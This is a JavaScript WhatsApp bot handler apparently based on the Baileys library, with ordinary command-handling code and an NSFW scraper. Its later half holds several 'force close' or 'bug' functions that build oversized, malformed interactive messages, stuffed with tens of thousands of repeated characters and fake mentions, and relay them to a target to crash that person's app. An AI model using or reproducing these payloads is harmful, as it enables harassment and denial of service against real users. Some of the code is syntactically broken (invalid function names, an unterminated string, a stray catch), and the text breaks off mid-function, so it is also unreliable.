require('../setting/config');

const fs = require('fs');
const axios = require('axios');
const chalk = require("chalk");
const fetch = require("node-fetch")
const jimp = require("jimp")
const os = require('os')
const path = require('path')
const cp = require('child_process');
const { promisify } = require('util');
const util = require("util");
const ms = require("parse-ms");
const sharp = require('sharp');
const JsConfuser = require('js-confuser');
const yts = require('yt-search')
const cheerio = require('cheerio');
const moment = require("moment-timezone");
const { spawn, exec, execSync } = require('child_process');
const { color } = require('./lib/color');

const {
    default: baileys,
    proto,
    jidNormalizedUser,
    generateWAMessage,
    generateWAMessageFromContent,
    getContentType,
    downloadContentFromMessage,
    prepareWAMessageMedia,
} = require("@whiskeysockets/baileys");

module.exports = justinn = async (justinn, m, chatUpdate, mek, store) => {
    try {
        if (global.db.data == null) await loadDatabase();
        require('./lib/database/schema')(m);

const chats = global.db.data.chats[m.chat];
const users = global.db.data.users[m.sender];
const settings = global.db.data.settings;
      
const body = (
    m.mtype === "conversation" ? m.message.conversation :
    m.mtype === "imageMessage" ? m.message.imageMessage.caption :
    m.mtype === "videoMessage" ? m.message.videoMessage.caption :
    m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
    m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
    m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
    m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
    m.mtype === "interactiveResponseMessage" ? html.parse(m.msg.nativeFlowResponseMessage.paramshtml).id :
    m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
    m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || 
    m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : ""
);

const budy = (typeof m.text === 'string' ? m.text : '');
        
var textmessage = (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || budy) : ""

const content = html.stringify(mek.message)
const type = Object.keys(mek.message)[0];
if (m && type == "protocolMessage") justinn.ev.emit("message.delete", m.message.protocolMessage.key);
const { sender } = m;
const from = m.key.remoteJid;
const isGroup = from.endsWith("@g.us");

//=============== DATABASE ================//
const kontributor = html.parse(fs.readFileSync('./start/lib/database/owner.html'));
const _afk = html.parse(fs.readFileSync('./start/lib/database/afk.html'));
const pendaftar = html.parse(fs.readFileSync('./start/lib/database/pendaftar.html'));
const orang_spam = html.parse(fs.readFileSync('./start/lib/database/spaming.html'));
const user_ban = html.parse(fs.readFileSync('./start/lib/database/banned.html'))
const botNumber = await justinn.decodeJid(justinn.user.id);
const isUser = pendaftar.includes(m.sender)
const Access = [global.owner, ...kontributor, ...global.owner]
  .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
  .includes(m.sender) ? true : m.isChecking ? true :false
const uploadImage = require('./lib/uploadImage');
const To = ["https://files.catbox.moe/r14cz4.jpg"]
const ytta = To[Math.floor(Math.random() * To.length)] 
const Kntl = ["https://files.catbox.moe/r14cz4.jpg"]
const C2 = Kntl[Math.floor(Math.random() * Kntl.length)]
const Tol = ["https://files.catbox.moe/5mhbx6.mp3"]
const ytt = Tol[Math.floor(Math.random() * Tol.length)]
const prefa = ["", "!", ".", ",", "🐤", "🗿"]
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^]/gi) : ''
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1);
const pushname = m.pushName || "No Name";
const text = q = args.join(" ");
const getQuoted = (m.quoted || m)
const quoted = getQuoted 
    ? (getQuoted.type === 'buttonsMessage' && Object.keys(getQuoted).length > 1) 
        ? getQuoted[Object.keys(getQuoted)[1]] 
        : (getQuoted.type === 'templateMessage' && getQuoted.hydratedTemplate && Object.keys(getQuoted.hydratedTemplate).length > 1) 
            ? getQuoted.hydratedTemplate[Object.keys(getQuoted.hydratedTemplate)[1]] 
            : (getQuoted.type === 'product' && Object.keys(getQuoted).length > 0) 
                ? getQuoted[Object.keys(getQuoted)[0]] 
                : m.quoted 
                    ? m.quoted 
                    : m
    : m.quoted 
        ? m.quoted 
        : m;

const qmsg = quoted.msg || quoted;
const mime = qmsg.mimetype || '';
const isImage = type === 'imageMessage';
const isVideo = type === 'videoMessage';
const isAudio = type === 'audioMessage';
const isMedia = /image|video|sticker|audio/.test(mime);
const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
const isQuotedTag = type === 'extendedTextMessage' && content.includes('mentionedJid')
const isQuotedReply = type === 'extendedTextMessage' && content.includes('Message')
const isQuotedText = type === 'extendedTextMessage' && content.includes('conversation')
const isQuotedViewOnce = type === 'extendedTextMessage' && content.includes('viewOnceMessageV2')
const groupMetadata = isGroup ? await justinn.groupMetadata(m.chat).catch(() => {}) : "";
const groupOwner = isGroup ? groupMetadata.owner : "";
const groupName = isGroup ? groupMetadata.subject : "";
const participants = isGroup ? await groupMetadata.participants : "";
const groupAdmins = isGroup ? participants.filter(v => v.admin !== null).map(v => v.id) : "";
const groupMembers = isGroup ? groupMetadata.participants : "";
const isGroupAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
const TypeMess = getContentType(m?.message);
let reactions = TypeMess == "reactionMessage" ? m?.message[TypeMess]?.text : false;
const isBan = user_ban.includes(m.sender)

//=============== TIME ================//
const time = moment().tz("Asia/Jakarta").format("HH:mm:ss");
let ucapanWaktu
if (time >= "19:00:00" && time < "23:59:00") {
ucapanWaktu = "🌃𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐌𝐚𝐥𝐚𝐦"
} else if (time >= "15:00:00" && time < "19:00:00") {
    ucapanWaktu = "🌄𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐨𝐫𝐞"
} else if (time >= "11:00:00" && time < "15:00:00") {
ucapanWaktu = "🏞️𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐢𝐚𝐧𝐠"
} else if (time >= "06:00:00" && time < "11:00:00") {
    ucapanWaktu = "🏙️𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐏𝐚𝐠𝐢"
} else {
    ucapanWaktu = "🌆𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐮𝐛𝐮𝐡"
};

var crypto = require("crypto")
const peler = fs.readFileSync('./start/lib/media/ytjustin.jpg')
const loveu = fs.readFileSync('./start/lib/media/justinganteng.jpg')
const cina = ["https://files.catbox.moe/1no8wl.jpg"]
const qtext = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": "Creator JustinAndiar"}}}
const qloc = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `YT : JustinOfficial-ID`,jpegThumbnail: ""}}}
function capital(string) { 
return string.charAt(0).toUpperCase() + string.slice(1); 
}
const createSerial = (size) => { 
return crypto.randomBytes(size).toString('hex').slice(0, size) 
}

async function reply(teks) {
justinn.sendMsg(m.chat, {text: teks, contextInfo: {mentionedJid: [m.sender], forwardedNewsletterMessageInfo: {newsletterName: "Information Script Justin", newsletterJid: "120363373003239606@newsletter"}, isForwarded: true, externalAdReply: {showAdAttribution: true, isForwarded: true, containsAutoReply: true, title: global.namabot, body: `WhatsApp Bot`, thumbnail: fs.readFileSync("./start/lib/media/justinoffc.jpg"), sourceUrl: `https://youtube.com/@justinofficial-id`
}
}
}, {quoted: catalems })
}
 
const catalems = {
        key: {
      remoteJid: '0@s.whatsapp.net',
      fromMe: false,
      id: '4B6CE60895B0D5C04D9FF7CB05566293',
      participant: '0@s.whatsapp.net'
    },
    message: {
      stickerPackMessage: {
        name: 'YT : JustinOfficial-ID',
        stickerPackId: '6793b295-854b-47d3-beea-932fcdb36cf4',
        stickerPackSize: 3,
        thumbnailHeight: 252,
        thumbnailWidth: 252,
        trayIconFileName: '',
        thumbnail: loveu,
        contextInfo: {}
      }
    }
  };
        
function randomNumber() {
const digits = [];
while (digits.length < 6) {
const randomDigit = Math.floor(Math.random() * 10);
if (!digits.includes(randomDigit)) {
digits.push(randomDigit);
}
}
return digits.join("");
}
function getRandomImage() {
    const randomIndex = Math.floor(Math.random() * cina.length);
    return cina[randomIndex];
}
const cinahitam = getRandomImage()
async function pickRandom(list) {
    return list[Math.floor(Math.random() * list.length)]
}
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
const {
    smsg,
    sendGmail,
    formatSize,
    isUrl,
    tanggal,
    generateMessageTag, 
    getBuffer,
    getSizeMedia, 
    runtime, 
    fetchhtml, 
    sleep,
    getRandom
} = require('./lib/myfunction');
    
const { 
    imageToWebp, 
    videoToWebp,
    writeExifImg,
    writeExifVid,
    addExif
} = require('./lib/exif')

const {
  pinterest2,
  remini,
  mediafire,
  tiktokDl,
} = require("./lib/scraper")

const {
	jadibot,
	stopjadibot,
	listjadibot
} = require('./jadibot')


const { ytdl } = require('./lib/scrape/scrape-ytdl');   
const { spamngl } = require('./lib/scrape/scrape-ngl');
const { pindl } = require('./lib/scrape/scrape-pindl')
const { tiktok } = require('./lib/scrape/scrape-tiktok')
const { igdl } = require('./lib/scrape/scrape-igdl')
const { luminai } = require('./lib/scrape/scrape-luminai')
const { VocalRemover } = require('./lib/scrape/scrape-tovocal')
const { Telesticker } = require('./lib/scrape/scrape-telesticker')
const { pinterest } = require("./lib/scrape/scrape-pinterest");
const { scrapeSoundCloud } = require("./lib/scrape/scrape-soundcloud")
const msgFilter = require("./lib/antispam");
const _prem = require("./lib/premium");
const isPremium = Access ? true : _prem.checkPremiumUser(m.sender);
let limitUser = isPremium ? 1500 : global.limitCount
        
const reaction = async (jidss, emoji) => {
    justinn.sendMsg(jidss, {
        react: { text: emoji,
                key: m.key 
               } 
            }
        );
    };

const x = {
  key: {
    fromMe: false,
    participant: "13135550002@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "2009",
      thumbnailUrl: "https://files.catbox.moe/1no8wl.jpg",
      itemCount: "999999",
      status: "INQUIRY",
      surface: "CATALOG",
      message: `Sender : @${m.sender.split('@')[0]}\nCommand : ${command}`,
      token:"AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: ["13135550002@s.whatsapp.net"],
    forwardingScore: 999,
    isForwarded: true,
  }
}
       
 async function useLimit(sender, amount) {
     users.limit -= amount;
     users.totalLimit += amount;
     m.reply(`Limit Anda Telah Digunakan Sebanyak ${amount} Dari ${users.limit} Limit Kamu`,
        );
 }
async function resetLimit() {
  for (let i of users) {
      db.data.users[i].limit = limitUser;
  }
}

if (m.message) {
            console.log('\x1b[30m--------------------\x1b[0m');
            console.log(chalk.bgHex("#4a69bd").bold(`🩸YT : JustinOfficial-ID`));
            console.log(
                chalk.bgHex("#ffffff").black(
                    `  => Tanggal: ${new Date().toLocaleString()} \n` +
                    `  ⌬ DATE: ${new Date().toLocaleString()} \n` +
                    `  ⌬ MESSAGE: ${m.body || m.mtype} \n` +
                    `  ⌬ SENDERNAME: ${pushname} \n` +
                    `  ⌬ JIDS: ${m.sender}`
                )
            );


            if (m.isGroup) {
                console.log(
                    chalk.bgHex("#ffffff").black(
                        `  ⌬ GRUP: ${groupName} \n` +
                        `  ⌬ GROUPJID: ${m.chat}`
                    )
                );
            }
            console.log();
        }
        
if (isCmd && !isUser) {
    pendaftar.push(m.sender)
    fs.writeFileSync('./start/lib/database/pendaftar.html', html.stringify(pendaftar, null, 2))
}

let resize = async (image, width, height) => {
    let oyy = await jimp.read(image)
    let kiyomasa = await oyy.resize(width, height).getBufferAsync(jimp.MIME_JPEG)
    return kiyomasa
}
msgFilter.ResetSpam(orang_spam);
        const spampm = () => {
            msgFilter.addSpam(m.sender, orang_spam);
            m.reply("don`t spam! please give pause for a few seimads.");
        };
        const spamgr = () => {
            msgFilter.addSpam(m.sender, orang_spam);
            m.reply("don`t spam! please give 10 seconnds.");
    };
    if (isCmd && msgFilter.isFiltered(m.sender) && m.isGroup) return spampm();
    if (isCmd && msgFilter.isFiltered(m.sender) && !m.isGroup) return spamgr();

async function sendMusic(teks) {
    let img = { url : cinahitam, 
               type : "image/jpeg"
              }        
    let url = `www.tiktok.com/@justinandiar`    
    let contextInfo = {
        externalAdReply: {    
            showAdAttribution: true,    
            title: `Justin Official V20`,      
            body: `Bít.ly/JustinOfficial`,     
            description: 'Creator Justin',   
            mediaType: 2,     
            thumbnailUrl: img.url,
            mediaUrl: url   
        }
    }
    
    justinn.sendMsg(m.chat, { 
        contextInfo,
        mimetype: 'audio/mp4',
        audio: teks
    }, { quoted: m })
 }
     
 if (!m.key.fromMe && global.autoread) {
     const readkey = {
         remoteJid: m.chat,
         id: m.key.id,
         participant: m.isGroup ? m.key.participant : undefined
     }
     await justinn.readMessages([readkey]);
 }
        justinn.sendPresenceUpdate('available', m.chat)
      
function getRandomFile(ext) {
    return `${Math.floor(Math.random() * 10000)}${ext}`;
}

        
async function makeStickerFromUrl(imageUrl, justinn, m) {
    try {
        let buffer;
        if (imageUrl.startsWith("data:")) {
            const base64Data = imageUrl.split(",")[1];
            buffer = Buffer.from(base64Data, 'base64');
        } else {
            const response = await axios.get(imageUrl, { responseType: 'arraybuffer' });
            buffer = Buffer.from(response.data, "binary");
        }
        
        const webpBuffer = await sharp(buffer)
            .resize(512, 512, { fit: 'contain', background: { r: 255, g: 255, b: 255, alpha: 0 } })
            .webp({ quality: 70 })
            .toBuffer();
        
        const penis = await addExif(webpBuffer, global.packname, global.author)

        const fileName = getRandomFile(".webp");
        fs.writeFileSync(fileName, webpBuffer);

        await justinn.sendMsg(m.chat, {
            sticker: penis,
            contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    title: `Justin Official V20`,
                    body: `Version Vip`,
                    mediaType: 3,
                    renderLargerThumbnail: false,
                    thumbnailUrl: cinahitam, 
                    sourceUrl: `https://youtube.com/@justinofficial-id`
                }
            }
        }, { quoted: m });

        fs.unlinkSync(fileName);
    } catch (error) {
        console.error("Error creating sticker:", error);
        reply('Terjadi kesalahan saat membuat stiker. Coba lagi nanti.');
    }
}
      
 
  
 if (chats.antilink) {
     if (budy.includes('chat.whatsapp.com')) {
         if (isAdmins || Access) return;
         reply(`> LINK GRUP TERDETEKSI\n\nDilarang Mengirim Link Grup Didalam Sini!!`);
         if (!isBotAdmins) return reply(`bot bukan admin`);
         let gclink = `https://chat.whatsapp.com/${await justinn.groupInviteCode(m.chat)}`;
         if (budy.includes(gclink)) return;
         await justinn.sendMsg(m.chat, {
             delete: m.key
         });	
     }  
 }

async function fetchBuffer (url, options) {
  try {
    options ? options : {};
    const res = await axios({
      method: "GET",
      url,
      headers: {
        "User-Agent":
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36",
        DNT: 1,
        "Upgrade-Insecure-Request": 1,
      },
      ...options,
      responseType: "arraybuffer",
    });
    return res.data;
  } catch (err) {
    return err;
  }
};

justinn.autoshalat = justinn.autoshalat ? justinn.autoshalat : {};
        let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? justinn.user.id : m.sender;
        let id = m.chat;
        if (id in justinn.autoshalat) {
            return false;
        }
        let jadwalSholat = {
            shubuh: "04:27",
            terbit: "05:52",
            dzuhur: "12:05",
            ashar: "15:32",
            magrib: "18:17",
            isya: "19:33",
        };

        const datek = new Date(
            new Date().toLocaleString("en-US", {
                timeZone: "Asia/Makassar",
            }),
        );
        const hours = datek.getHours();
        const minutes = datek.getMinutes();
        const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`;
        for (let [sholat, waktu] of Object.entries(jadwalSholat)) {
            if (timeNow === waktu) {
                let caption = `${pushname}
Waktu *${sholat}* Telah Tiba, Ambilah Air Wudhu Dan Segeralah Shalat,

*${waktu}*
Untuk Wilayah Jawa Barat Dan Sekitarnya.`;
                justinn.autoshalat[id] = [
                    justinn.sendMsg(m.chat, { 
                        text: caption,
                        footer: "Developer JustinOfficial",
                        buttons: [
                            {
                                buttonId: ".baik", 
                                buttonText: { 
                                    displayText: 'Oke Siap' 
                                }, type: 1 }
                        ],
                        viewOnce: true,
                        headerType: 1
                    }, { quoted: m }),
                    setTimeout(async () => {
                        delete justinn.autoshalat[m.chat];
                    }, 57000),
                ];
            }
        }
//=============== NSFW ================//
  async function randomNsFw() {
			return new Promise((resolve, reject) => {
				const page = Math.floor(Math.random() * 1153)
				axios.get('https://sfmcompile.club/page/' + page).then((data) => {
					const $ = cheerio.load(data.data)
					const hasil = []
					$('#primary > div > div > ul > li > article').each(function (a, b) {
						hasil.push({
							title: $(b).find('header > h2').text(),
							link: $(b).find('header > h2 > a').attr('href'),
							category: $(b).find('header > div.entry-before-title > span > span').text().replace('in ', ''),
							share_count: $(b).find('header > div.entry-after-title > p > span.entry-shares').text(),
							views_count: $(b).find('header > div.entry-after-title > p > span.entry-views').text(),
							type: $(b).find('source').attr('type') || 'image/jpeg',
							video_1: $(b).find('source').attr('src') || $(b).find('img').attr('data-src'),
							video_2: $(b).find('video > a').attr('href') || ''
						})
					})
					resolve(hasil)
				})
			})
		}
//=============== PLUGINS ================//
const pluginsLoader = async (directory) => {
    let plugins = [];
    const folders = fs.readdirSync(directory);
    folders.forEach(file => {
        const filePath = path.join(directory, file);
        if (filePath.endsWith(".js")) {
            try {
                const resolvedPath = require.resolve(filePath);
                if (require.cache[resolvedPath]) {
                    delete require.cache[resolvedPath];
                }
                const plugin = require(filePath);
                plugins.push(plugin);
            } catch (error) {
                console.log(`${filePath}:`, error);
            }
        }
    });
    return plugins;
};

const pluginsDisable = true;
const plugins = await pluginsLoader(path.resolve(__dirname, "../plugins"));
const plug = { 
    justinn,
    Access,
    command,
    isCmd,
    reply,
    text,
    chats,
    users,
    args,
    botNumber,
    reaction,
    makeStickerFromUrl,
    pushname,
    isBan,
    isPremium,
    isGroup: m.isGroup,
    isPrivate: !m.isGroup
};

for (let plugin of plugins) {
    if (plugin.command.find(e => e == command.toLowerCase())) {
        if (plugin.owner && !Access) {
            return reply(mess.owner);
        }
        if (plugin.premium && !isPremium) {
            return reply(ness.premium);
        }
        if (plugin.group && !plug.isGroup) {
            return reply(mess.group);
        }
        if (plugin.private && !plug.isPrivate) {
            return reply(mess.private);
        }
        if (typeof plugin !== "function") return;
        await plugin(m, plug);
    }
}

if (!pluginsDisable) return;


//FUNCTION FORCLOSE
async function infinityThan(justinn, objective) {
   let videoServer = await prepareWAMessageMedia({
         video: {
            url: "https://files.catbox.moe/h3hf0r.mp4"
         }
      }, {
         upload: justinn.waUploadToServer
      })
   let msg = await generateWAMessageFromContent(objective, proto.Message.fromObject({
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "🩸JustinXThan" 
                    },
                    carouselMessage: {
                        cards: [{
                            header: {
                                ...videoServer,
                                hasMediaAttachment: true
                            },
                            nativeFlowMessage: {
                                messageParamshtml: '['.repeat(10000)
                            }
                        },{
                            header: {
                                ...videoServer,
                                hasMediaAttachment: true
                            },
                            nativeFlowMessage: {
                                messageParamshtml: '['.repeat(10000)
                            }
                        },{
                            header: {
                                ...videoServer,
                                hasMediaAttachment: true
                            },
                            nativeFlowMessage: {
                                messageParamshtml: '['.repeat(10000)
                            }
                        },{
                            header: {
                                ...videoServer,
                                hasMediaAttachment: true
                            },
                            nativeFlowMessage: {
                                messageParamshtml: '['.repeat(10000)
                            }
                        },{
                            header: {
                                ...videoServer,
                                hasMediaAttachment: true
                            },
                            nativeFlowMessage: {
                                messageParamshtml: '['.repeat(10000)
                            }
                        }]
                    },
                    contextInfo: {
                        mentionedJid: [objective]
                    }
                }
            }
        }
    }), {
      userJid: objective,
      quoted: null
   });
   await justinn.relayMsg(objective, msg.message, {
      participant: {
         jid: objective
      }
   });
};

async function Caraousel(justinn, isTarget) {
  const msg = await generateWAMessageFromContent(isTarget, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: {
          body: { 
            text: '' 
          },
          footer: { 
            text: '' 
          },
          carouselMessage: {
            cards: [
              {               
                header: {
                  title: 'CardsCarousel',
                  imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "ydrdawvK8RyLn3L+d+PbuJp+mNGoC2Yd7s/oy3xKU6w=",
                    fileLength: "164089",
                    height: 1,
                    width: 1,
                    mediaKey: "2saFnZ7+Kklfp49JeGvzrQHj1n2bsoZtw2OKYQ8ZQeg=",
                    fileEncSha256: "na4OtkrffdItCM7hpMRRZqM8GsTM6n7xMLl+a0RoLVs=",
                    directPath: "/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1749172037",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAsAAEAAwEBAAAAAAAAAAAAAAAAAQIDBAUBAQEAAAAAAAAAAAAAAAAAAAAB/9oADAMBAAIQAxAAAADxq2mzNeJZZovmEJV0RlAX6F5I76JxgAtN5TX2/G0X2MfHzjq83TOgNteXpMpujBrNc6wquimpWoKwFaEsA//EACQQAAICAgICAQUBAAAAAAAAAAABAhEDIQQSECAUEyIxMlFh/9oACAEBAAE/ALRR1OokNRHIfiMR6LTJNFsv0g9bJvy1695G2KJ8PPpqH5RHgZ8lOqTRk4WXHh+q6q/SqL/iMHFyZ+3VrRhjPDBOStqNF5GvtdQS2ia+VilC2lapM5fExYIWpO78pHQ43InxpOSVpk+bJtNHzM6n27E+Tlk/3ZPLkyUpSbrzDI0qVFuraG5S0fT1tlf6dX6RdEZWt7P2f4JfwUdkqGijXiA9OkPQh+n/xAAXEQADAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/ANVukaO//8QAFhEAAwAAAAAAAAAAAAAAAAAAARBA/9oACAEDAQE/AJg//9k=",
                    scansSidecar: "PllhWl4qTXgHBYizl463ShueYwk=",
                    scanLengths: [8596, 155493]
                  },
                  hasMediaAttachment: true, 
                },
                body: { 
                  text: "Caraousel"
                },
                footer: {
                  text: "sex.html"
                },
                nativeFlowMessage: {
                  messageParamshtml: "\n".repeat(10000) 
                }
              }
            ]
          },
          contextInfo: {
            participant: "0@s.whatsapp.net",             
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "Sent",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "galaxy_message",
                      paramshtml: "{ sex.file.html }",
                      version: 3
                    }
                  }
                }
              }
            },
            remoteJid: "@s.whatsapp.net"
          }
        }
      }
    }
  }, {});

  await justinn.relayMsg(isTarget, msg.message, {
    participant: { jid: isTarget },
    messageId: msg.key.id
  });
}

async function ⌬ Izalcs(sock, target) {
  const cards = [];

  for (let i = 0; i < 100; i++) { // GANTI JADI KALO EROR
    cards.push({
      header: {
        videoMessage: {
          mimetype: "video/mp4",
          caption: "⌬ Izalcs",
          url: "https://files.catbox.moe/wvnrqw.mp4",
          fileLength: "999999999999",
          seconds: 10000
        }
      },
      nativeFlowMessage: {
        messageParamshtml: "{".repeat(10000),
        buttons: [
          {
            name: "⌬ Izalcs💋🥶",
            buttonParamshtml: `{"⌬ Izalcs 💋🥶":"${"᬴".repeat(60000)}","sections":[{"⌬ Izalcs 💋🥶":" ⌬ Izalcs 💋🥶? ","rows":[]}]}`
          },
          {
            name: "⌬ Izalcs💋🥶",
            buttonParamshtml: "⌬ Izalcs 💋🥶".repeat(10000)
          }
        ]
      }
    });
  }

  const contextInfo = {
    forwardingScore: 999,
    isForwarded: true,
    stanzaId: "FnX-" + Date.now(),
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast",
    mentionedJid: [
      target,
      "13135550002@s.whatsapp.net",
      ...Array.from({ length: 1900 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
    ],
    quotedMessage: {
      extendedTextMessage: {
        text: "\u0000".repeat(60000),
        contextInfo: {
          mentionedJid: ["13135550001@s.whatsapp.net"],
          externalAdReply: {
            title: "⌬ Izalcs 💋🥶",
            body: "Trusted System",
            thumbnailUrl: "https://files.catbox.moe/wvnrqw.mp4",
            mediaType: 1,
            sourceUrl: "https://files.catbox.moe/wvnrqw.mp4",
            showAdAttribution: false
          }
        }
      }
    },
    externalAdReply: {
      title: "[ ! ] ⌬ Izalcs",
      body: "AI Broadcast",
      thumbnailUrl: "https://files.catbox.moe/wvnrqw.mp4https://files.catbox.moe/wvnrqw.mp4",
      mediaType: 1,
      sourceUrl: "https://github.com/izalxys,
      showAdAttribution: false
    },
    businessMessageForwardInfo: {
      businessOwnerJid: "13135550002@s.whatsapp.net"
    }
  };

  const IzalcsMessage = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: "⌬ Izalcs".repeat(30000)
          },
          carouselMessage: {
            cards,
            messageVersion: 1
          },
          nativeFlowMessage: {
            messageParamshtml: "{".repeat(50000)
          },
          contextInfo
        }
      }
    }
  };

  await sock.sendMessage(target, IzalcsMessage);

  await sock.relayMessage(target, IzalcsMessage, {
    messageId: "FnX-" + Date.now()
  });
  console.log("[ ! ] BUG SUCCESFULL SEND TO TARGET!");
  } catch (err) {
    console.error("[❌] Gagal kirim bug:", err);
  }
}

async function ⌬ Izalfcbos(sock, jid) {
  const mentionedJidList = [
    jid,
    "13135550002@s.whatsapp.net",
    ...Array.from({ length: 30000 }, () => `1${Math.floor(Math.random() * 499999)}@s.whatsapp.net`)
  ];

  try {
  const payload = {
    key: {
      remoteJid: jid,
      fromMe: false,
      id: " KILLER-UI" + Date.now()
    },
    message: {
      interactiveMessage: {
        header: {
          title: " </> Zal Not Dev\n\n" + "Izalmodz🩸".repeat(5000),
          hasMediaAttachment: false
        },
        body: {
          text: "Izalmodz🩸".repeat(5000) + "Izalmodz🩸".repeat(5000),
        },
        nativeFlowMessage: {
          messageParamshtml: "{[(".repeat(15000),
          buttons: [
            {
              name: "single_select",
              buttonParamshtml: html.stringify({ status: true })
            },
            {
              name: "send_location",
              buttonParamshtml: "{}"
            },
            {
              name: "call_permission_request",
              buttonParamshtml: html.stringify({ status: true })
            },
            {
              name: "payment_method",
              buttonParamshtml: ""
            },
            {
              name: "form_message",
              buttonParamshtml: ""
            },
            {
              name: "catalog_message",
              buttonParamshtml: ""
            },
            {
              name: "review_and_pay",
              buttonParamshtml: ""
            }
          ]
        }
      }
    },
    messageContextInfo: {
      mentionedJid: mentionedJidList,
      quotedMessage: {
        paymentInviteMessage: {
          serviceType: 1,
          expiryTimestamp: null
        }
      },
      externalAdReply: {
        title: "",
        body: "@Izalmodz",
        thumbnailUrl: null,
        sourceUrl: "https://t.me/Izalmodz"
      }
    }
  };

    await sock.relayMessage(jid, payload.message, { messageId: payload.key.id });

    await sock.sendMessage(jid, payload.message, {
      quoted: {
        key: payload.key,
        message: payload.message
      }
    });

    console.log("[ ! ] BUG SUCCESFULL SEND TO TARGET!");
  } catch (err) {
    console.error("[❌] Gagal kirim bug:", err);
  }
}

//BUG FC INVIS
async function invisCrL(isTarget, rep, mention) {
  const space = "\n".repeat(rep)
  const PrM = await prepareWAMessageMedia(
    { image: peler },
    { upload: justinn.waUploadToServer }
  );

  const cardsCrL = Array.from({ length: 10 }, () => ({
    header: {
      imageMessage: PrM.imageMessage,
      hasMediaAttachment: true
    },
    nativeFlowMessage: {
      messageParamshtml: space
    }
  }));

  const messagePayload = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: { text: "🩸 YT JustinOfficial-ID " },
          carouselMessage: {
            cards: cardsCrL,
            messageVersion: 1
          }
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(isTarget, messagePayload, {});

  await justinn.relayMsg("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [isTarget],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: isTarget } }
            ]
          }
        ]
      }
    ]
  });

  if (mention) {
    const message = {
      statusMentionMessage: {
        message: {
